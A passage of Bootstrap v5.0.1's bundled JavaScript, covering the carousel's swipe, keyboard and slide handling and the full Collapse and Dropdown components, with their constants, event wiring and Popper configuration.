      };

      const move = event => {
        // ensure swiping with one touch and not pinching
        this.touchDeltaX = event.touches && event.touches.length > 1 ? 0 : event.touches[0].clientX - this.touchStartX;
      };

      const end = event => {
        if (this._pointerEvent && (event.pointerType === POINTER_TYPE_PEN || event.pointerType === POINTER_TYPE_TOUCH)) {
          this.touchDeltaX = event.clientX - this.touchStartX;
        }

        this._handleSwipe();

        if (this._config.pause === 'hover') {
          // If it's a touch-enabled device, mouseenter/leave are fired as
          // part of the mouse compatibility events on first tap - the carousel
          // would stop cycling until user tapped out of it;
          // here, we listen for touchend, explicitly pause the carousel
          // (as if it's the second time we tap on it, mouseenter compat event
          // is NOT fired) and after a timeout (to allow for mouse compatibility
          // events to fire) we explicitly restart cycling
          this.pause();

          if (this.touchTimeout) {
            clearTimeout(this.touchTimeout);
          }

          this.touchTimeout = setTimeout(event => this.cycle(event), TOUCHEVENT_COMPAT_WAIT + this._config.interval);
        }
      };

      SelectorEngine.find(SELECTOR_ITEM_IMG, this._element).forEach(itemImg => {
        EventHandler.on(itemImg, EVENT_DRAG_START, e => e.preventDefault());
      });

      if (this._pointerEvent) {
        EventHandler.on(this._element, EVENT_POINTERDOWN, event => start(event));
        EventHandler.on(this._element, EVENT_POINTERUP, event => end(event));

        this._element.classList.add(CLASS_NAME_POINTER_EVENT);
      } else {
        EventHandler.on(this._element, EVENT_TOUCHSTART, event => start(event));
        EventHandler.on(this._element, EVENT_TOUCHMOVE, event => move(event));
        EventHandler.on(this._element, EVENT_TOUCHEND, event => end(event));
      }
    }

    _keydown(event) {
      if (/input|textarea/i.test(event.target.tagName)) {
        return;
      }

      if (event.key === ARROW_LEFT_KEY) {
        event.preventDefault();

        this._slide(DIRECTION_RIGHT);
      } else if (event.key === ARROW_RIGHT_KEY) {
        event.preventDefault();

        this._slide(DIRECTION_LEFT);
      }
    }

    _getItemIndex(element) {
      this._items = element && element.parentNode ? SelectorEngine.find(SELECTOR_ITEM, element.parentNode) : [];
      return this._items.indexOf(element);
    }

    _getItemByOrder(order, activeElement) {
      const isNext = order === ORDER_NEXT;
      const isPrev = order === ORDER_PREV;

      const activeIndex = this._getItemIndex(activeElement);

      const lastItemIndex = this._items.length - 1;
      const isGoingToWrap = isPrev && activeIndex === 0 || isNext && activeIndex === lastItemIndex;

      if (isGoingToWrap && !this._config.wrap) {
        return activeElement;
      }

      const delta = isPrev ? -1 : 1;
      const itemIndex = (activeIndex + delta) % this._items.length;
      return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];
    }

    _triggerSlideEvent(relatedTarget, eventDirectionName) {
      const targetIndex = this._getItemIndex(relatedTarget);

      const fromIndex = this._getItemIndex(SelectorEngine.findOne(SELECTOR_ACTIVE_ITEM, this._element));

      return EventHandler.trigger(this._element, EVENT_SLIDE, {
        relatedTarget,
        direction: eventDirectionName,
        from: fromIndex,
        to: targetIndex
      });
    }

    _setActiveIndicatorElement(element) {
      if (this._indicatorsElement) {
        const activeIndicator = SelectorEngine.findOne(SELECTOR_ACTIVE$1, this._indicatorsElement);
        activeIndicator.classList.remove(CLASS_NAME_ACTIVE$2);
        activeIndicator.removeAttribute('aria-current');
        const indicators = SelectorEngine.find(SELECTOR_INDICATOR, this._indicatorsElement);

        for (let i = 0; i < indicators.length; i++) {
          if (Number.parseInt(indicators[i].getAttribute('data-bs-slide-to'), 10) === this._getItemIndex(element)) {
            indicators[i].classList.add(CLASS_NAME_ACTIVE$2);
            indicators[i].setAttribute('aria-current', 'true');
            break;
          }
        }
      }
    }

    _updateInterval() {
      const element = this._activeElement || SelectorEngine.findOne(SELECTOR_ACTIVE_ITEM, this._element);

      if (!element) {
        return;
      }

      const elementInterval = Number.parseInt(element.getAttribute('data-bs-interval'), 10);

      if (elementInterval) {
        this._config.defaultInterval = this._config.defaultInterval || this._config.interval;
        this._config.interval = elementInterval;
      } else {
        this._config.interval = this._config.defaultInterval || this._config.interval;
      }
    }

    _slide(directionOrOrder, element) {
      const order = this._directionToOrder(directionOrOrder);

      const activeElement = SelectorEngine.findOne(SELECTOR_ACTIVE_ITEM, this._element);

      const activeElementIndex = this._getItemIndex(activeElement);

      const nextElement = element || this._getItemByOrder(order, activeElement);

      const nextElementIndex = this._getItemIndex(nextElement);

      const isCycling = Boolean(this._interval);
      const isNext = order === ORDER_NEXT;
      const directionalClassName = isNext ? CLASS_NAME_START : CLASS_NAME_END;
      const orderClassName = isNext ? CLASS_NAME_NEXT : CLASS_NAME_PREV;

      const eventDirectionName = this._orderToDirection(order);

      if (nextElement && nextElement.classList.contains(CLASS_NAME_ACTIVE$2)) {
        this._isSliding = false;
        return;
      }

      const slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);

      if (slideEvent.defaultPrevented) {
        return;
      }

      if (!activeElement || !nextElement) {
        // Some weirdness is happening, so we bail
        return;
      }

      this._isSliding = true;

      if (isCycling) {
        this.pause();
      }

      this._setActiveIndicatorElement(nextElement);

      this._activeElement = nextElement;

      const triggerSlidEvent = () => {
        EventHandler.trigger(this._element, EVENT_SLID, {
          relatedTarget: nextElement,
          direction: eventDirectionName,
          from: activeElementIndex,
          to: nextElementIndex
        });
      };

      if (this._element.classList.contains(CLASS_NAME_SLIDE)) {
        nextElement.classList.add(orderClassName);
        reflow(nextElement);
        activeElement.classList.add(directionalClassName);
        nextElement.classList.add(directionalClassName);

        const completeCallBack = () => {
          nextElement.classList.remove(directionalClassName, orderClassName);
          nextElement.classList.add(CLASS_NAME_ACTIVE$2);
          activeElement.classList.remove(CLASS_NAME_ACTIVE$2, orderClassName, directionalClassName);
          this._isSliding = false;
          setTimeout(triggerSlidEvent, 0);
        };

        this._queueCallback(completeCallBack, activeElement, true);
      } else {
        activeElement.classList.remove(CLASS_NAME_ACTIVE$2);
        nextElement.classList.add(CLASS_NAME_ACTIVE$2);
        this._isSliding = false;
        triggerSlidEvent();
      }

      if (isCycling) {
        this.cycle();
      }
    }

    _directionToOrder(direction) {
      if (![DIRECTION_RIGHT, DIRECTION_LEFT].includes(direction)) {
        return direction;
      }

      if (isRTL()) {
        return direction === DIRECTION_LEFT ? ORDER_PREV : ORDER_NEXT;
      }

      return direction === DIRECTION_LEFT ? ORDER_NEXT : ORDER_PREV;
    }

    _orderToDirection(order) {
      if (![ORDER_NEXT, ORDER_PREV].includes(order)) {
        return order;
      }

      if (isRTL()) {
        return order === ORDER_PREV ? DIRECTION_LEFT : DIRECTION_RIGHT;
      }

      return order === ORDER_PREV ? DIRECTION_RIGHT : DIRECTION_LEFT;
    } // Static


    static carouselInterface(element, config) {
      let data = Data.get(element, DATA_KEY$9);
      let _config = { ...Default$9,
        ...Manipulator.getDataAttributes(element)
      };

      if (typeof config === 'object') {
        _config = { ..._config,
          ...config
        };
      }

      const action = typeof config === 'string' ? config : _config.slide;

      if (!data) {
        data = new Carousel(element, _config);
      }

      if (typeof config === 'number') {
        data.to(config);
      } else if (typeof action === 'string') {
        if (typeof data[action] === 'undefined') {
          throw new TypeError(`No method named "${action}"`);
        }

        data[action]();
      } else if (_config.interval && _config.ride) {
        data.pause();
        data.cycle();
      }
    }

    static jQueryInterface(config) {
      return this.each(function () {
        Carousel.carouselInterface(this, config);
      });
    }

    static dataApiClickHandler(event) {
      const target = getElementFromSelector(this);

      if (!target || !target.classList.contains(CLASS_NAME_CAROUSEL)) {
        return;
      }

      const config = { ...Manipulator.getDataAttributes(target),
        ...Manipulator.getDataAttributes(this)
      };
      const slideIndex = this.getAttribute('data-bs-slide-to');

      if (slideIndex) {
        config.interval = false;
      }

      Carousel.carouselInterface(target, config);

      if (slideIndex) {
        Data.get(target, DATA_KEY$9).to(slideIndex);
      }

      event.preventDefault();
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API$5, SELECTOR_DATA_SLIDE, Carousel.dataApiClickHandler);
  EventHandler.on(window, EVENT_LOAD_DATA_API$2, () => {
    const carousels = SelectorEngine.find(SELECTOR_DATA_RIDE);

    for (let i = 0, len = carousels.length; i < len; i++) {
      Carousel.carouselInterface(carousels[i], Data.get(carousels[i], DATA_KEY$9));
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Carousel to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Carousel);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): collapse.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$9 = 'collapse';
  const DATA_KEY$8 = 'bs.collapse';
  const EVENT_KEY$8 = `.${DATA_KEY$8}`;
  const DATA_API_KEY$5 = '.data-api';
  const Default$8 = {
    toggle: true,
    parent: ''
  };
  const DefaultType$8 = {
    toggle: 'boolean',
    parent: '(string|element)'
  };
  const EVENT_SHOW$5 = `show${EVENT_KEY$8}`;
  const EVENT_SHOWN$5 = `shown${EVENT_KEY$8}`;
  const EVENT_HIDE$5 = `hide${EVENT_KEY$8}`;
  const EVENT_HIDDEN$5 = `hidden${EVENT_KEY$8}`;
  const EVENT_CLICK_DATA_API$4 = `click${EVENT_KEY$8}${DATA_API_KEY$5}`;
  const CLASS_NAME_SHOW$8 = 'show';
  const CLASS_NAME_COLLAPSE = 'collapse';
  const CLASS_NAME_COLLAPSING = 'collapsing';
  const CLASS_NAME_COLLAPSED = 'collapsed';
  const WIDTH = 'width';
  const HEIGHT = 'height';
  const SELECTOR_ACTIVES = '.show, .collapsing';
  const SELECTOR_DATA_TOGGLE$4 = '[data-bs-toggle="collapse"]';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Collapse extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._isTransitioning = false;
      this._config = this._getConfig(config);
      this._triggerArray = SelectorEngine.find(`${SELECTOR_DATA_TOGGLE$4}[href="#${this._element.id}"],` + `${SELECTOR_DATA_TOGGLE$4}[data-bs-target="#${this._element.id}"]`);
      const toggleList = SelectorEngine.find(SELECTOR_DATA_TOGGLE$4);

      for (let i = 0, len = toggleList.length; i < len; i++) {
        const elem = toggleList[i];
        const selector = getSelectorFromElement(elem);
        const filterElement = SelectorEngine.find(selector).filter(foundElem => foundElem === this._element);

        if (selector !== null && filterElement.length) {
          this._selector = selector;

          this._triggerArray.push(elem);
        }
      }

      this._parent = this._config.parent ? this._getParent() : null;

      if (!this._config.parent) {
        this._addAriaAndCollapsedClass(this._element, this._triggerArray);
      }

      if (this._config.toggle) {
        this.toggle();
      }
    } // Getters


    static get Default() {
      return Default$8;
    }

    static get NAME() {
      return NAME$9;
    } // Public


    toggle() {
      if (this._element.classList.contains(CLASS_NAME_SHOW$8)) {
        this.hide();
      } else {
        this.show();
      }
    }

    show() {
      if (this._isTransitioning || this._element.classList.contains(CLASS_NAME_SHOW$8)) {
        return;
      }

      let actives;
      let activesData;

      if (this._parent) {
        actives = SelectorEngine.find(SELECTOR_ACTIVES, this._parent).filter(elem => {
          if (typeof this._config.parent === 'string') {
            return elem.getAttribute('data-bs-parent') === this._config.parent;
          }

          return elem.classList.contains(CLASS_NAME_COLLAPSE);
        });

        if (actives.length === 0) {
          actives = null;
        }
      }

      const container = SelectorEngine.findOne(this._selector);

      if (actives) {
        const tempActiveData = actives.find(elem => container !== elem);
        activesData = tempActiveData ? Data.get(tempActiveData, DATA_KEY$8) : null;

        if (activesData && activesData._isTransitioning) {
          return;
        }
      }

      const startEvent = EventHandler.trigger(this._element, EVENT_SHOW$5);

      if (startEvent.defaultPrevented) {
        return;
      }

      if (actives) {
        actives.forEach(elemActive => {
          if (container !== elemActive) {
            Collapse.collapseInterface(elemActive, 'hide');
          }

          if (!activesData) {
            Data.set(elemActive, DATA_KEY$8, null);
          }
        });
      }

      const dimension = this._getDimension();

      this._element.classList.remove(CLASS_NAME_COLLAPSE);

      this._element.classList.add(CLASS_NAME_COLLAPSING);

      this._element.style[dimension] = 0;

      if (this._triggerArray.length) {
        this._triggerArray.forEach(element => {
          element.classList.remove(CLASS_NAME_COLLAPSED);
          element.setAttribute('aria-expanded', true);
        });
      }

      this.setTransitioning(true);

      const complete = () => {
        this._element.classList.remove(CLASS_NAME_COLLAPSING);

        this._element.classList.add(CLASS_NAME_COLLAPSE, CLASS_NAME_SHOW$8);

        this._element.style[dimension] = '';
        this.setTransitioning(false);
        EventHandler.trigger(this._element, EVENT_SHOWN$5);
      };

      const capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);
      const scrollSize = `scroll${capitalizedDimension}`;

      this._queueCallback(complete, this._element, true);

      this._element.style[dimension] = `${this._element[scrollSize]}px`;
    }

    hide() {
      if (this._isTransitioning || !this._element.classList.contains(CLASS_NAME_SHOW$8)) {
        return;
      }

      const startEvent = EventHandler.trigger(this._element, EVENT_HIDE$5);

      if (startEvent.defaultPrevented) {
        return;
      }

      const dimension = this._getDimension();

      this._element.style[dimension] = `${this._element.getBoundingClientRect()[dimension]}px`;
      reflow(this._element);

      this._element.classList.add(CLASS_NAME_COLLAPSING);

      this._element.classList.remove(CLASS_NAME_COLLAPSE, CLASS_NAME_SHOW$8);

      const triggerArrayLength = this._triggerArray.length;

      if (triggerArrayLength > 0) {
        for (let i = 0; i < triggerArrayLength; i++) {
          const trigger = this._triggerArray[i];
          const elem = getElementFromSelector(trigger);

          if (elem && !elem.classList.contains(CLASS_NAME_SHOW$8)) {
            trigger.classList.add(CLASS_NAME_COLLAPSED);
            trigger.setAttribute('aria-expanded', false);
          }
        }
      }

      this.setTransitioning(true);

      const complete = () => {
        this.setTransitioning(false);

        this._element.classList.remove(CLASS_NAME_COLLAPSING);

        this._element.classList.add(CLASS_NAME_COLLAPSE);

        EventHandler.trigger(this._element, EVENT_HIDDEN$5);
      };

      this._element.style[dimension] = '';

      this._queueCallback(complete, this._element, true);
    }

    setTransitioning(isTransitioning) {
      this._isTransitioning = isTransitioning;
    } // Private


    _getConfig(config) {
      config = { ...Default$8,
        ...config
      };
      config.toggle = Boolean(config.toggle); // Coerce string values

      typeCheckConfig(NAME$9, config, DefaultType$8);
      return config;
    }

    _getDimension() {
      return this._element.classList.contains(WIDTH) ? WIDTH : HEIGHT;
    }

    _getParent() {
      let {
        parent
      } = this._config;
      parent = getElement(parent);
      const selector = `${SELECTOR_DATA_TOGGLE$4}[data-bs-parent="${parent}"]`;
      SelectorEngine.find(selector, parent).forEach(element => {
        const selected = getElementFromSelector(element);

        this._addAriaAndCollapsedClass(selected, [element]);
      });
      return parent;
    }

    _addAriaAndCollapsedClass(element, triggerArray) {
      if (!element || !triggerArray.length) {
        return;
      }

      const isOpen = element.classList.contains(CLASS_NAME_SHOW$8);
      triggerArray.forEach(elem => {
        if (isOpen) {
          elem.classList.remove(CLASS_NAME_COLLAPSED);
        } else {
          elem.classList.add(CLASS_NAME_COLLAPSED);
        }

        elem.setAttribute('aria-expanded', isOpen);
      });
    } // Static


    static collapseInterface(element, config) {
      let data = Data.get(element, DATA_KEY$8);
      const _config = { ...Default$8,
        ...Manipulator.getDataAttributes(element),
        ...(typeof config === 'object' && config ? config : {})
      };

      if (!data && _config.toggle && typeof config === 'string' && /show|hide/.test(config)) {
        _config.toggle = false;
      }

      if (!data) {
        data = new Collapse(element, _config);
      }

      if (typeof config === 'string') {
        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`);
        }

        data[config]();
      }
    }

    static jQueryInterface(config) {
      return this.each(function () {
        Collapse.collapseInterface(this, config);
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API$4, SELECTOR_DATA_TOGGLE$4, function (event) {
    // preventDefault only for <a> elements (which change the URL) not inside the collapsible element
    if (event.target.tagName === 'A' || event.delegateTarget && event.delegateTarget.tagName === 'A') {
      event.preventDefault();
    }

    const triggerData = Manipulator.getDataAttributes(this);
    const selector = getSelectorFromElement(this);
    const selectorElements = SelectorEngine.find(selector);
    selectorElements.forEach(element => {
      const data = Data.get(element, DATA_KEY$8);
      let config;

      if (data) {
        // update parent attribute
        if (data._parent === null && typeof triggerData.parent === 'string') {
          data._config.parent = triggerData.parent;
          data._parent = data._getParent();
        }

        config = 'toggle';
      } else {
        config = triggerData;
      }

      Collapse.collapseInterface(element, config);
    });
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Collapse to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Collapse);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): dropdown.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$8 = 'dropdown';
  const DATA_KEY$7 = 'bs.dropdown';
  const EVENT_KEY$7 = `.${DATA_KEY$7}`;
  const DATA_API_KEY$4 = '.data-api';
  const ESCAPE_KEY$2 = 'Escape';
  const SPACE_KEY = 'Space';
  const TAB_KEY = 'Tab';
  const ARROW_UP_KEY = 'ArrowUp';
  const ARROW_DOWN_KEY = 'ArrowDown';
  const RIGHT_MOUSE_BUTTON = 2; // MouseEvent.button value for the secondary button, usually the right button

  const REGEXP_KEYDOWN = new RegExp(`${ARROW_UP_KEY}|${ARROW_DOWN_KEY}|${ESCAPE_KEY$2}`);
  const EVENT_HIDE$4 = `hide${EVENT_KEY$7}`;
  const EVENT_HIDDEN$4 = `hidden${EVENT_KEY$7}`;
  const EVENT_SHOW$4 = `show${EVENT_KEY$7}`;
  const EVENT_SHOWN$4 = `shown${EVENT_KEY$7}`;
  const EVENT_CLICK = `click${EVENT_KEY$7}`;
  const EVENT_CLICK_DATA_API$3 = `click${EVENT_KEY$7}${DATA_API_KEY$4}`;
  const EVENT_KEYDOWN_DATA_API = `keydown${EVENT_KEY$7}${DATA_API_KEY$4}`;
  const EVENT_KEYUP_DATA_API = `keyup${EVENT_KEY$7}${DATA_API_KEY$4}`;
  const CLASS_NAME_SHOW$7 = 'show';
  const CLASS_NAME_DROPUP = 'dropup';
  const CLASS_NAME_DROPEND = 'dropend';
  const CLASS_NAME_DROPSTART = 'dropstart';
  const CLASS_NAME_NAVBAR = 'navbar';
  const SELECTOR_DATA_TOGGLE$3 = '[data-bs-toggle="dropdown"]';
  const SELECTOR_MENU = '.dropdown-menu';
  const SELECTOR_NAVBAR_NAV = '.navbar-nav';
  const SELECTOR_VISIBLE_ITEMS = '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)';
  const PLACEMENT_TOP = isRTL() ? 'top-end' : 'top-start';
  const PLACEMENT_TOPEND = isRTL() ? 'top-start' : 'top-end';
  const PLACEMENT_BOTTOM = isRTL() ? 'bottom-end' : 'bottom-start';
  const PLACEMENT_BOTTOMEND = isRTL() ? 'bottom-start' : 'bottom-end';
  const PLACEMENT_RIGHT = isRTL() ? 'left-start' : 'right-start';
  const PLACEMENT_LEFT = isRTL() ? 'right-start' : 'left-start';
  const Default$7 = {
    offset: [0, 2],
    boundary: 'clippingParents',
    reference: 'toggle',
    display: 'dynamic',
    popperConfig: null,
    autoClose: true
  };
  const DefaultType$7 = {
    offset: '(array|string|function)',
    boundary: '(string|element)',
    reference: '(string|element|object)',
    display: 'string',
    popperConfig: '(null|object|function)',
    autoClose: '(boolean|string)'
  };
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Dropdown extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._popper = null;
      this._config = this._getConfig(config);
      this._menu = this._getMenuElement();
      this._inNavbar = this._detectNavbar();

      this._addEventListeners();
    } // Getters


    static get Default() {
      return Default$7;
    }

    static get DefaultType() {
      return DefaultType$7;
    }

    static get NAME() {
      return NAME$8;
    } // Public


    toggle() {
      if (isDisabled(this._element)) {
        return;
      }

      const isActive = this._element.classList.contains(CLASS_NAME_SHOW$7);

      if (isActive) {
        this.hide();
        return;
      }

      this.show();
    }

    show() {
      if (isDisabled(this._element) || this._menu.classList.contains(CLASS_NAME_SHOW$7)) {
        return;
      }

      const parent = Dropdown.getParentFromElement(this._element);
      const relatedTarget = {
        relatedTarget: this._element
      };
      const showEvent = EventHandler.trigger(this._element, EVENT_SHOW$4, relatedTarget);

      if (showEvent.defaultPrevented) {
        return;
      } // Totally disable Popper for Dropdowns in Navbar


      if (this._inNavbar) {
        Manipulator.setDataAttribute(this._menu, 'popper', 'none');
      } else {
        if (typeof Popper__namespace === 'undefined') {
          throw new TypeError('Bootstrap\'s dropdowns require Popper (https://popper.js.org)');
        }

        let referenceElement = this._element;

        if (this._config.reference === 'parent') {
          referenceElement = parent;
        } else if (isElement(this._config.reference)) {
          referenceElement = getElement(this._config.reference);
        } else if (typeof this._config.reference === 'object') {
          referenceElement = this._config.reference;
        }

        const popperConfig = this._getPopperConfig();

        const isDisplayStatic = popperConfig.modifiers.find(modifier => modifier.name === 'applyStyles' && modifier.enabled === false);
        this._popper = Popper__namespace.createPopper(referenceElement, this._menu, popperConfig);

        if (isDisplayStatic) {
          Manipulator.setDataAttribute(this._menu, 'popper', 'static');
        }
      } // If this is a touch-enabled device we add extra
      // empty mouseover listeners to the body's immediate children;
      // only needed because of broken event delegation on iOS
      // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html


      if ('ontouchstart' in document.documentElement && !parent.closest(SELECTOR_NAVBAR_NAV)) {
        [].concat(...document.body.children).forEach(elem => EventHandler.on(elem, 'mouseover', noop));
      }

      this._element.focus();

      this._element.setAttribute('aria-expanded', true);

      this._menu.classList.toggle(CLASS_NAME_SHOW$7);

      this._element.classList.toggle(CLASS_NAME_SHOW$7);

      EventHandler.trigger(this._element, EVENT_SHOWN$4, relatedTarget);
    }

    hide() {
      if (isDisabled(this._element) || !this._menu.classList.contains(CLASS_NAME_SHOW$7)) {
        return;
      }

      const relatedTarget = {
        relatedTarget: this._element
      };

      this._completeHide(relatedTarget);
    }

    dispose() {
      if (this._popper) {
        this._popper.destroy();
      }

      super.dispose();
    }

    update() {
      this._inNavbar = this._detectNavbar();

      if (this._popper) {
        this._popper.update();
      }
    } // Private


    _addEventListeners() {
      EventHandler.on(this._element, EVENT_CLICK, event => {
        event.preventDefault();
        this.toggle();
      });
    }

    _completeHide(relatedTarget) {
      const hideEvent = EventHandler.trigger(this._element, EVENT_HIDE$4, relatedTarget);

      if (hideEvent.defaultPrevented) {
        return;
      } // If this is a touch-enabled device we remove the extra
      // empty mouseover listeners we added for iOS support


      if ('ontouchstart' in document.documentElement) {
        [].concat(...document.body.children).forEach(elem => EventHandler.off(elem, 'mouseover', noop));
      }

      if (this._popper) {
        this._popper.destroy();
      }

      this._menu.classList.remove(CLASS_NAME_SHOW$7);

      this._element.classList.remove(CLASS_NAME_SHOW$7);

      this._element.setAttribute('aria-expanded', 'false');

      Manipulator.removeDataAttribute(this._menu, 'popper');
      EventHandler.trigger(this._element, EVENT_HIDDEN$4, relatedTarget);
    }

    _getConfig(config) {
      config = { ...this.constructor.Default,
        ...Manipulator.getDataAttributes(this._element),
        ...config
      };
      typeCheckConfig(NAME$8, config, this.constructor.DefaultType);

      if (typeof config.reference === 'object' && !isElement(config.reference) && typeof config.reference.getBoundingClientRect !== 'function') {
        // Popper virtual elements require a getBoundingClientRect method
        throw new TypeError(`${NAME$8.toUpperCase()}: Option "reference" provided type "object" without a required "getBoundingClientRect" method.`);
      }

      return config;
    }

    _getMenuElement() {
      return SelectorEngine.next(this._element, SELECTOR_MENU)[0];
    }

    _getPlacement() {
      const parentDropdown = this._element.parentNode;

      if (parentDropdown.classList.contains(CLASS_NAME_DROPEND)) {
        return PLACEMENT_RIGHT;
      }

      if (parentDropdown.classList.contains(CLASS_NAME_DROPSTART)) {
        return PLACEMENT_LEFT;
      } // We need to trim the value because custom properties can also include spaces


      const isEnd = getComputedStyle(this._menu).getPropertyValue('--bs-position').trim() === 'end';

      if (parentDropdown.classList.contains(CLASS_NAME_DROPUP)) {
        return isEnd ? PLACEMENT_TOPEND : PLACEMENT_TOP;
      }

      return isEnd ? PLACEMENT_BOTTOMEND : PLACEMENT_BOTTOM;
    }

    _detectNavbar() {
      return this._element.closest(`.${CLASS_NAME_NAVBAR}`) !== null;
    }

    _getOffset() {
      const {
        offset
      } = this._config;

      if (typeof offset === 'string') {
        return offset.split(',').map(val => Number.parseInt(val, 10));
      }

      if (typeof offset === 'function') {
        return popperData => offset(popperData, this._element);
      }

      return offset;
    }

    _getPopperConfig() {
      const defaultBsPopperConfig = {
        placement: this._getPlacement(),
        modifiers: [{
          name: 'preventOverflow',
          options: {
            boundary: this._config.boundary
          }
        }, {
          name: 'offset',
          options: {
            offset: this._getOffset()
          }
        }]
      }; // Disable Popper if we have a static display

      if (this._config.display === 'static') {
        defaultBsPopperConfig.modifiers = [{
          name: 'applyStyles',
          enabled: false
        }];
      }

      return { ...defaultBsPopperConfig,
        ...(typeof this._config.popperConfig === 'function' ? this._config.popperConfig(defaultBsPopperConfig) : this._config.popperConfig)
      };
    }

    _selectMenuItem(event) {
      const items = SelectorEngine.find(SELECTOR_VISIBLE_ITEMS, this._menu).filter(isVisible);

      if (!items.length) {
        return;
      }

      let index = items.indexOf(event.target); // Up

      if (event.key === ARROW_UP_KEY && index > 0) {
        index--;
      } // Down


      if (event.key === ARROW_DOWN_KEY && index < items.length - 1) {
        index++;
      } // index is -1 if the first keydown is an ArrowUp


      index = index === -1 ? 0 : index;
      items[index].focus();
    } // Static


    static dropdownInterface(element, config) {
      let data = Data.get(element, DATA_KEY$7);

      const _config = typeof config === 'object' ? config : null;

      if (!data) {
        data = new Dropdown(element, _config);
      }

      if (typeof config === 'string') {
        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`);
        }

        data[config]();
      }
    }

    static jQueryInterface(config) {
      return this.each(function () {
        Dropdown.dropdownInterface(this, config);
      });
    }

    static clearMenus(event) {
      if (event && (event.button === RIGHT_MOUSE_BUTTON || event.type === 'keyup' && event.key !== TAB_KEY)) {
        return;
      }

      const toggles = SelectorEngine.find(SELECTOR_DATA_TOGGLE$3);

      for (let i = 0, len = toggles.length; i < len; i++) {
        const context = Data.get(toggles[i], DATA_KEY$7);

        if (!context || context._config.autoClose === false) {
          continue;
        }

        if (!context._element.classList.contains(CLASS_NAME_SHOW$7)) {
          continue;
        }

        const relatedTarget = {
          relatedTarget: context._element
        };

        if (event) {
          const composedPath = event.composedPath();
          const isMenuTarget = composedPath.includes(context._menu);

          if (composedPath.includes(context._element) || context._config.autoClose === 'inside' && !isMenuTarget || context._config.autoClose === 'outside' && isMenuTarget) {
            continue;
          } // Tab navigation through the dropdown menu or events from contained inputs shouldn't close the menu


          if (context._menu.contains(event.target) && (event.type === 'keyup' && event.key === TAB_KEY || /input|select|option|textarea|form/i.test(event.target.tagName))) {
            continue;
          }

          if (event.type === 'click') {
            relatedTarget.clickEvent = event;
          }
        }

        context._completeHide(relatedTarget);
      }
    }

    static getParentFromElement(element) {
      return getElementFromSelector(element) || element.parentNode;
    }

    static dataApiKeydownHandler(event) {
      // If not input/textarea:
      //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
      // If input/textarea:
      //  - If space key => not a dropdown command
      //  - If key is other than escape
      //    - If key is not up or down => not a dropdown command
      //    - If trigger inside the menu => not a dropdown command
      if (/input|textarea/i.test(event.target.tagName) ? event.key === SPACE_KEY || event.key !== ESCAPE_KEY$2 && (event.key !== ARROW_DOWN_KEY && event.key !== ARROW_UP_KEY || event.target.closest(SELECTOR_MENU)) : !REGEXP_KEYDOWN.test(event.key)) {
        return;
      }

      const isActive = this.classList.contains(CLASS_NAME_SHOW$7);

      if (!isActive && event.key === ESCAPE_KEY$2) {
        return;
      }

      event.preventDefault();
      event.stopPropagation();

      if (isDisabled(this)) {
        return;
      }

      const getToggleButton = () => this.matches(SELECTOR_DATA_TOGGLE$3) ? this : SelectorEngine.prev(this, SELECTOR_DATA_TOGGLE$3)[0];

      if (event.key === ESCAPE_KEY$2) {
        getToggleButton().focus();
        Dropdown.clearMenus();
        return;
      }

      if (!isActive && (event.key === ARROW_UP_KEY || event.key === ARROW_DOWN_KEY)) {
        getToggleButton().click();
        return;
      }

      if (!isActive || event.key === SPACE_KEY) {
        Dropdown.clearMenus();
        return;
      }

      Dropdown.getInstance(getToggleButton())._selectMenuItem(event);
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_KEYDOWN_DATA_API, SELECTOR_DATA_TOGGLE$3, Dropdown.dataApiKeydownHandler);
  EventHandler.on(document, EVENT_KEYDOWN_DATA_API, SELECTOR_MENU, Dropdown.dataApiKeydownHandler);
  EventHandler.on(document, EVENT_CLICK_DATA_API$3, Dropdown.clearMenus);
  EventHandler.on(document, EVENT_KEYUP_DATA_API, Dropdown.clearMenus);
  EventHandler.on(document, EVENT_CLICK_DATA_API$3, SELECTOR_DATA_TOGGLE$3, function (event) {
    event.preventDefault();
    Dropdown.dropdownInterface(this);
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Dropdown to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Dropdown);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): util/scrollBar.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
